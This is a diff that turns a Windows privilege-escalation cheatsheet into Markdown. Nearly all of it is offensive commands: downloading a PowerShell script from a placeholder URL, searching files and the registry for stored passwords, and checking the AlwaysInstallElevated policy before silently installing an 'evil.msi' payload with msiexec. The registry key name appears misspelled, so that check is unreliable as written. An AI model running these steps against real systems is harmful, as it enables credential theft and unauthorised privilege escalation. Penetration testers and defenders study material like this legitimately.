@@ -1,35 +1,48 @@
-TO FORMAT
+# Windows Privilege Escalation Cheatsheet
 
-List powershell module dirs:
+#### List powershell module directories
 
+```powershell
 echo $Env:PSModulePath
+```
 
-Download file:
+#### Download file
 
+```powershell
 Invoke-WebRequest http://url-to/file.ps1 -OutFile C:\path\to\file.ps1
+```
 
-Search for passwords:
+#### Search for passwords in filesystem
 
-cmd style: dir /s \*pass\* == \*cred\* == \*vnc\* == \*.config\*
+```shell
+cmd style: dir /s *pass* == *cred* == *vnc* == *.config*
+```
 
-powershell style: findstr /si password \*.xml \*.ini \*.txt
+```powershell
+powershell style: findstr /si password *.xml *.ini *.txt
+```
 
+```powershell
 reg query HKLM /f password /t REG_SZ /s
+```
 
+```powershell
 reg query HKCU /f password /t REG_SZ /s
+```
 
+#### MSI register
 
-MSI REG:
-
+```powershell
 reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstalledElevated
+```
 
--> 1
+```powershell
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstalledElevated
+```
 
--> 1
+If both return 1, then get an evil.msi and:
 
-=> get an evil.msi
-
-=> msiexec /quiet /qn /i evil.msi
-
+```powershell
+msiexec /quiet /qn /i evil.msi
+```
 
